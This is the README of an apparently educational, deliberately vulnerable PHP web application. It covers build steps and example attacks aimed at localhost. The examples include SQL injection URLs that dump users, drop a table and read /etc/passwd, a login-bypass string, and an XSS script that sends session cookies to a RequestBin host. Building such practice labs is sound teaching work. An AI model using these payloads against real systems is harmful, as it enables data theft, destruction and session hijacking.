# Hack This
A collection of common web programming mistakes.

![Screenshot](screenshot_small.png)

This website, when set up and configured, contains a number of vulnerabilities that can be exploited, including:

* SQL Injection
* XSS (Cross-Site Scripting)
* Session Hijacking

## Prerequisites
You'll need to have a web server installed and configured with PHP for this to work. I really recommend [XAMPP](https://www.apachefriends.org/), especially for Windows users. Once you've done that you can proceed.

You'll also need [Node.js](https://nodejs.org/en/) and [npm](https://www.npmjs.com/) installed and working.

## Building
Clone the project down and open the folder in your favourite editor. It's a JetBrains PhpStorm project but you can use whichever paid/free software takes your fancy.

First, install the npm packages necessary to build and run the website. Run the following in your terminal in the project root directory:

```
npm install
```

This will install [Bower](https://bower.io/) which will allow you to install the assets the website requires (Bootstrap, jQuery etc.) using the command:

```
bower install
```

Gulp will also have been installed. This will compile the [Less](http://lesscss.org/) and [CoffeeScript](http://coffeescript.org/) into CSS and JS ready for production. Do this using the command:

```
gulp
```

This command will need running again every time you make a change to a Less file. If you're working on them, run `gulp watch` in a terminal to watch for file changes and compile accordingly.

## Setup
To set everything up, you'll need to: 

* Import the file `db.sql` into your database
* Modify the file `db_configuration.php` to correspond to your database
* Access the site and get hacking

## Examples
Examples of vulnerabilities in this web application include:

### SQL Injection
In an SQL injection attack, malicious SQL statements are inserted into an entry field for execution (usually in a data-driven web application). 

* Get information for all users: 
    - `http://localhost/customers.php?username=leocadio'%20or%20'1'='1`
    - `http://localhost/customers.php?username=leocadio'%20or%20''='`
    - `http://localhost/customers.php?id=1%20or%201=1`
* Drop (destroy) invoices table: 
    - `http://localhost/customers.php?id=1;drop%20table%20invoices`
* Dump the password hash file from the server: 
    - Unix: `http://localhost/customers.php?username='%20UNION%20SELECT%201,1,1,1,LOAD_FILE('/etc/passwd'),'1`
* Dump several things at once (oh boy): 
    - `http://localhost/customers.php?username='%20UNION%20SELECT%201,2,3,4,5,'hello%20world`

### Bypass Login (SQL Injection)
It's possible to bypass login completely (logging in as whoever you like) by adding an always-true condition to the password check:

```
foo' or '1'='1
```

### Session Hijacking (XSS)
Using a service like [RequestBin](https://requestbin.fullcontact.com/) it's possible to hijack user sessions by capturing their session cookie. Try sending a message to a user consisting of the following code (with `{{ bin_id }}` substituted out for your RequestBin bin ID).

```html
<script>
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "http://requestbin.fullcontact.com/{{ bin_id }}?c=" + document.cookie, false);
    xmlHttp.send(null);
</script>
```

## Warnings
This site is intentionally left vulnerable to common exploits. Don't host it on the same server as any production sites, only ever deploy it on a machine that you wouldn't mind bricking (I recommend a disposable VM).
